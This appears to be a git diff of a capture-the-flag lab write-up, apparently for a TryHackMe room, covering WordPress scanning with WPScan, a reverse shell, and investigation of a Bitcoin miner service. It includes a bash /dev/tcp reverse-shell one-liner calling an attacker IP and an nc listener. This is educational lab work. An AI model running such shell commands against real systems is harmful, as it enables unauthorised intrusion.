@@ -20,9 +20,15 @@
   
   - I noticed multiple references of "wp-", leading me to believe it was referencing WordPress, so I decided to try WPScan.
 
-  - I opened the terminal and typed the command, "wpscan --url https://bricks.thm/".
+  - I opened the terminal and ran the command for WPScan.
+    ```bash
+    wpscan --url https://bricks.thm/
+    ```
       - The scan aborted, "url seems to be down, SSL peer certificate or SSH remote key was not OK".
-      - Retried scan while disabling the tls certificate check, "wpscan --url https://bricks.thm/ --disable-tls-checks".
+      - Retried scan while disabling the tls certificate check.
+        ```bash
+         wpscan --url https://bricks.thm/ --disable-tls-checks
+        ```
         
   - The scan ran successfully, the results showed the style "bricks" for WordPress, and the version was 1.9.5.
 
@@ -70,14 +76,65 @@
           ```
             - Results: Deprecated connection. This means that the shell we are using is unstable.
     
-    - I then tried to set up a reverse shell to hopefully have access to a more stable shell.
+    -  I then attempted to set up a reverse shell to hopefully have access to a more stable shell.
       ``` bash
       bash -c 'exec bash -i &>/dev/tcp/10.10.96.228/4444 <&1'
       ```
-      
-        - Before executing the reverse shell command, I opened another terminal to set up a listener on port 4444.
-          ``` bash
-          nc -lvnp 4444
-          ```
+    - Before executing the reverse shell command, I opened another terminal to set up a listener on port 4444.
+    ``` bash
+      nc -lvnp 4444
+    ```
+      - Executed the reverse shell command, the initial access shell closed and a new connection began within the terminal with the listener.
+        
+      - We then had a stable connection to the shell where we could further explore.
+            - I began exploring by running the ``` bash ls ``` command to see what was within the current directory.
+                - The results showed a list of .txt and .php files.
 
-          - Executed the reverse shell command.
+    - There were two .txt files that could be seen, one of which had a very long, odd name.
+   
+    - I used cat to open the file.
+        ```bash
+        cat 650c844110baced87e1606453b93f22a.txt
+        ```
+        - Within this file, the flag was found, answering the first question of the room.
+        - There were a few other interesting files, such as wp-config.php, which shows hard-coded credentials for the phpMyAdmin page. We might come back to this later.
+     
+  ## Step 4: Identifying the Suspicious Process
+  
+  - I had to use Google to find the command for Linux to show running processes on a system.
+    ``` bash
+    systemctl --type=service --state=running
+    ```
+    - Among the list of running services shown, I saw one that really stuck out, it was labeled as ubuntu.service and the description was "TRYHACK3M".
+        - I used the cat command to look further into the process.
+          ``` bash
+          systemctl cat ubuntu.service
+          ```
+          - By doing this, I was able to see that the service was running from a directory located in /lib/NetworkManager/nm-inet-dialog.
+              - This gave me the answer to question two for the room.
+                
+          - I changed directories to /lib/NetworkManager to investigate further.
+            ``` bash
+            cd /lib/NetworkManager
+            ```
+          - I used the ls command to attempt to discover other files located within this directory, I wanted to see more information so I used the command ls -l.
+            ``` bash
+            ls -l
+            ```
+            - Within this list, there was one file that had read-only permissions, named inet.conf.
+              
+            - I tried the cat command on the inet.conf file, but it was just a lot of lines repeating the same things, "2024-04-11 10:53:02, 04, 06, 08... [*] Miner()" etc. This led me to think that this process could be some sort of crypto miner and its logs.
+            
+            - To get a better idea of what exactly was inside of this process, I decided to use the command head, instead of cat.
+              ``` bash
+              head inet.conf
+              ```
+              - Doing this confirmed my suspicions of this being a crypto miner, it is a Bitcoin Miner to be exact, and this is where the logs could be found. This gave me the answer to question four.
+                
+              - This also confirmed that the ubuntu.service process was affiliated with the suspicious process, giving me the answer for question three.
+                
+- Using the head command, I also was able to find an ID. I thought it might have been encoded, so I used Google to find a website to quickly decode it.
+    - I was able to find a website called CyberChef. I copied and pasted the ID into the input and hit the magic wand since I wasn't sure exactly what it was encoded using.
+      - At the bottom of the output box, there was a counter to see how many characters were in the output. The output was 85 characters long.
+          - Since it's an ID for a Bitcoin Miner, I searched on Google to see how long Bitcoin Wallet addresses are, the results said
+              
